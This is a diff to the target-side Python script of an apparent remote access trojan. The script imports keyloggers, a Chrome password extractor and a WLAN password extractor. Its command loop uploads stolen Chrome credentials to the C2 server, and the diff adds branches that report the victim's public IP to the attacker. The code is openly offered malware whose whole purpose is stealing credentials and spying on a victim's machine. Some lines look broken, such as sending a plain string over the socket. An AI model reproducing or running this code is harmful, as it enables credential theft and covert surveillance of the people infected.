@@ -1,7 +1,6 @@
 #!/usr/bin/python3
 
 import socket
-import subprocess              # libray which enables us to use trgt OS command in C2 server
 
 import json                    # The process of encoding JSON is usually called serialization.
 			       # This term refers to the transformation of data into a series of bytes
@@ -10,15 +9,17 @@ import json                    # The process of encoding JSON is usually called 
 import PIL.ImageGrab           # python library for taking screenshot
 
 
-from termcolor import colored  # python coloring library
-
 import shutil                  # shutil module enables us to operate with file objects easily and without diving into file objects a lot
+
+from termcolor import colored  # python coloring library
 
 from lnx_keylogger import *
 
 from win_keylogger import *
 
 import win_chrome_password_extractor
+
+from wlan_password_extractor import *
 
 # Sending whole data all at once
 def recv_eff():
@@ -224,6 +225,8 @@ def shell():
 				continue                 # we know that after removing path nothing is shown in terminal/cmd,
 							 # so we have to send nothing as data from trgt
 
+
+		# Spoofing password from chrome browser win10 ✓
 		elif cmd[:12] == "spoof_passwd" and len(cmd) > 1:
 
 			win_chrome_password_extractor.main()
@@ -231,6 +234,33 @@ def shell():
 			upload_file('chrome_creds.txt')              # sending file with creds to C2 
 
 			os.remove('chrome_creds.txt')                # removing the file
+
+
+		# Spoof wan/public ip of trgt win10 machine  ✓
+		elif cmd[:11] == "spoof_wanip" and len(cmd) > 1:
+
+			send_eff(colored("[+] Wan/Public ip of trgt windows machine: ", 'green'))
+
+			w = wan_ip()
+
+			sock.send(w.encode('utf-8'))  # Encoding to send data
+
+
+		# This portion will be updated soon...
+
+		# spoofing wlan profile creds and wan/public ip from trgt win10 machine
+		elif cmd[:16] == "spoof_wlan_creds" and len(cmd) > 1:
+
+			# Printing trgt's wan.public ip
+			send_eff(colored("[+] Wan/Public ip of trgt windows machine: ", 'green'))
+
+			w = wan_ip()
+			
+			sock.send(w.encode('utf-8'))  # Encoding to send data
+
+			sock.send("\n")
+
+
 
 		# Screenshot ✓
 		elif (cmd[:10] == "screenshot" and len(cmd) > 1 ) or (cmd[:2] == 'ss' and len(cmd) > 1 ):
